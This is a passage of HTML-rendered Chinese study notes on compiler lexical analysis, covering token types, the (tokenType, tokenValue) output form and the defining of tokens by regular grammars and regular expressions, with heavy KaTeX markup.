词法分析程序</h3>\n<p>词法分析程序是语法分析程序的一个子程序（子类），每当语法分析程序需要一个单词符号时，就调用词法分析程序的API，让词法分析程序从输入的String中，识别出一个具有独立意义的token。</p>\n<h3 id=\"token\"><a class=\"markdownIt-Anchor\" href=\"#token\"></a> Token</h3>\n<h4 id=\"token简介\"><a class=\"markdownIt-Anchor\" href=\"#token简介\"></a> token简介</h4>\n<p>词法分析程序的输入是String形式的<strong>source program</strong>，输出tokens。这样的过程叫做tokenization。</p>\n<p>token是语言中具有独立意义的最小语法单位。一般分为5种：</p>\n<ol>\n<li>keyword\t比如：if, else, while, do等</li>\n<li>identifier\t比如：对象名、函数名等</li>\n<li>constant\t包括stringConstant、intConstant、floatConstant和boolConstant</li>\n<li>operator\t包括加减乘除等</li>\n<li>punctuator\t包括分号，逗号，括号等</li>\n</ol>\n<h4 id=\"输出token的形式\"><a class=\"markdownIt-Anchor\" href=\"#输出token的形式\"></a> 输出token的形式</h4>\n<p>以以下形式输出token：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mo fence=\"true\">(</mo><mi>t</mi><mi>o</mi><mi>k</mi><mi>e</mi><mi>n</mi><mi>T</mi><mi>y</mi><mi>p</mi><mi>e</mi><mo separator=\"true\">,</mo><mtext> </mtext><mi>t</mi><mi>o</mi><mi>k</mi><mi>e</mi><mi>n</mi><mi>V</mi><mi>a</mi><mi>l</mi><mi>u</mi><mi>e</mi><mo fence=\"true\">)</mo></mrow><annotation encoding=\"application/x-tex\">\\left(tokenType,\\ tokenValue\\right)\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">o</span><span class=\"mord mathdefault\" style=\"margin-right:0.03148em;\">k</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">y</span><span class=\"mord mathdefault\">p</span><span class=\"mord mathdefault\">e</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mspace\"> </span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">o</span><span class=\"mord mathdefault\" style=\"margin-right:0.03148em;\">k</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathdefault\">u</span><span class=\"mord mathdefault\">e</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span></span></p>\n<ol>\n<li>每一个tokenType对应一个整数编码。</li>\n<li>当一个tokenType里只含有一种value时，该整数编码就完全代表了value，因此value可以省略。</li>\n</ol>\n<h4 id=\"token的两种定义\"><a class=\"markdownIt-Anchor\" href=\"#token的两种定义\"></a> token的两种定义</h4>\n<h5 id=\"正规文法左线型文法或者右线性文法\"><a class=\"markdownIt-Anchor\" href=\"#正规文法左线型文法或者右线性文法\"></a> 正规文法（左线型文法或者右线性文法）</h5>\n<p>正规文法定义token易于识别，以identifier举例：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mo>&lt;</mo><mi>i</mi><mi>d</mi><mi>e</mi><mi>n</mi><mi>t</mi><mi>i</mi><mi>f</mi><mi>i</mi><mi>e</mi><mi>r</mi><mo>&gt;</mo><mo>→</mo><mi>l</mi><mi mathvariant=\"normal\">∣</mi><mo>&lt;</mo><mi>i</mi><mi>d</mi><mi>e</mi><mi>n</mi><mi>t</mi><mi>i</mi><mi>f</mi><mi>i</mi><mi>e</mi><mi>r</mi><mo>&gt;</mo><mi>l</mi><mi mathvariant=\"normal\">∣</mi><mo>&lt;</mo><mi>i</mi><mi>d</mi><mi>e</mi><mi>n</mi><mi>t</mi><mi>i</mi><mi>f</mi><mi>i</mi><mi>e</mi><mi>r</mi><mo>&gt;</mo><mi>d</mi><mspace linebreak=\"newline\"></mspace><mi>l</mi><mo>:</mo><mtext> </mtext><mi>a</mi><mo>∼</mo><mi>z</mi><mtext> </mtext><mi>o</mi><mi>r</mi><mtext> </mtext><mi>A</mi><mo>∼</mo><mi>Z</mi><mspace linebreak=\"newline\"></mspace><mi>d</mi><mo>:</mo><mtext> </mtext><mn>0</mn><mo>∼</mo><mn>9</mn></mrow><annotation encoding=\"application/x-tex\">&lt;identifier&gt; \\rightarrow l|&lt;identifier&gt;l|&lt;identifier&gt;d \\\\\nl:\\ a\\sim z \\  or\\  A \\sim Z\\\\\nd:\\ 0\\sim 9\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.5782em;vertical-align:-0.0391em;\"></span><span class=\"mrel\">&lt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\">d</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&gt;</span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.36687em;vertical-align:0em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord\">∣</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&lt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\">d</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&gt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord\">∣</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&lt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\">d</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&gt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">d</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.01968em;\">l</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\"> </span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∼</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.04398em;\">z</span><span class=\"mspace\"> </span><span class=\"mord mathdefault\">o</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">r</span><span class=\"mspace\"> </span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∼</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">Z</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">d</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\"> </span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">0</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∼</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">9</span></span></span></span></span></p>\n<h5 id=\"正规式-regular-expression\"><a class=\"markdownIt-Anchor\" href=\"#正规式-regular-expression\"></a> 正规式 regular expression</h5>\n<p>设存在字母表<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi mathvariant=\"normal\">Σ</mi><mo>=</mo><mrow><mo fence=\"true\">{</mo><msub><mi>a</mi><mn>1</mn></msub><mo separator=\"true\">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mo separator=\"true\">,</mo><msub><mi>a</mi><mi>n</mi></msub><mo fence=\"true\">}</mo></mrow></mrow><annotation encoding=\"application/x-tex\">\\Sigma = \\left \\{a_{1}, a_{2},...,a_{n}\\right\\}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">Σ</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">{</span><span class=\"mord\"><span class=\"mord mathdefault\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">n</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">}</span></span></span></span></span>，在其上的正规式与正规式表示的正规集用以下（递归）规则定义：</p>\n<ol>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi mathvariant=\"normal\">∅</mi></mrow><annotation encoding=\"application/x-tex\">\\varnothing</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.66334em;vertical-align:-0.08167em;\"></span><span class=\"mord amsrm\">∅</span></span></span></span>是<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi mathvariant=\"normal\">Σ</mi></mrow><annotation encoding=\"application/x-tex\">\\Sigma</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">Σ</span></span></span></span>上的正规式，表示的正规集也是<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi mathvariant=\"normal\">∅</mi></mrow><annotation encoding=\"application/x-tex\">\\varnothing</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.66334em;vertical-align:-0.08167em;\"></span><span class=\"mord amsrm\">∅</span></span></span></span>。</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding=\"application/x-tex\">\\epsilon</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">ϵ</span></span></span></span>是<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi mathvariant=\"normal\">Σ</mi></mrow><annotation encoding=\"application/x-tex\">\\Sigma</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">Σ</span></span></span></span>上的正规式，表示的正规集是<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mo fence=\"true\">{</mo><mi>ϵ</mi><mo fence=\"true\">}</mo></mrow><annotation encoding=\"application/x-tex\">\\left\\{\\epsilon\\right\\}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">{</span><span class=\"mord mathdefault\">ϵ</span><span class=\"mclose delimcenter\" style=\"top:0em;\">}</span></span></span></span></span>。</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">a_{i}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>是<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi mathvariant=\"normal\">Σ</mi></mrow><annotation encoding=\"application/x-tex\">\\Sigma</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">Σ</span></span></span></span>上的正规式，表示的正规集是<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mo fence=\"true\">{</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence=\"true\">}</mo></mrow><annotation encoding=\"application/x-tex\">\\left\\{a_{i}\\right\\}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">{</span><span class=\"mord\"><span class=\"mord mathdefault\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">}</span></span></span></span></span>。</li>\n<li>若<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>e</mi><mn>1</mn></msub></mrow><annotation encoding=\"application/x-tex\">e_{1}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>和<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>e</mi><mn>2</mn></msub></mrow><annotation encoding=\"application/x-tex\">e_{2}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>都是<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi mathvariant=\"normal\">Σ</mi></mrow><annotation encoding=\"application/x-tex\">\\Sigma</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">Σ</span></span></span></span>上的正规式，所表示的正规集为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>L</mi><mrow><mo fence=\"true\">(</mo><msub><mi>e</mi><mn>1</mn></msub><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">L\\left(e_{1}\\right)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">L</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span>和<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>L</mi><mrow><mo fence=\"true\">(</mo><msub><mi>e</mi><mn>2</mn></msub><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">L\\left(e_{2}\\right)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">L</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span>，那么\n<ol>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>e</mi><mn>1</mn></msub><mi mathvariant=\"normal\">∣</mi><msub><mi>e</mi><mn>2</mn></msub></mrow><annotation encoding=\"application/x-tex\">e_{1}|e_{2}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>也是正规式，<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>L</mi><mrow><mo fence=\"true\">(</mo><msub><mi>e</mi><mn>1</mn></msub><mi mathvariant=\"normal\">∣</mi><msub><mi>e</mi><mn>2</mn></msub><mo fence=\"true\">)</mo></mrow><mo>=</mo><mi>L</mi><mrow><mo fence=\"true\">(</mo><msub><mi>e</mi><mn>1</mn></msub><mo fence=\"true\">)</mo></mrow><mo>∪</mo><mi>L</mi><mrow><mo fence=\"true\">(</mo><msub><mi>e</mi><mn>2</mn></msub><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">L\\left(e_{1}|e_{2}\\right)=L\\left(e_{1}\\right) \\cup L\\left(e_{2}\\right)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">L</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">L</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∪</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">L</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" 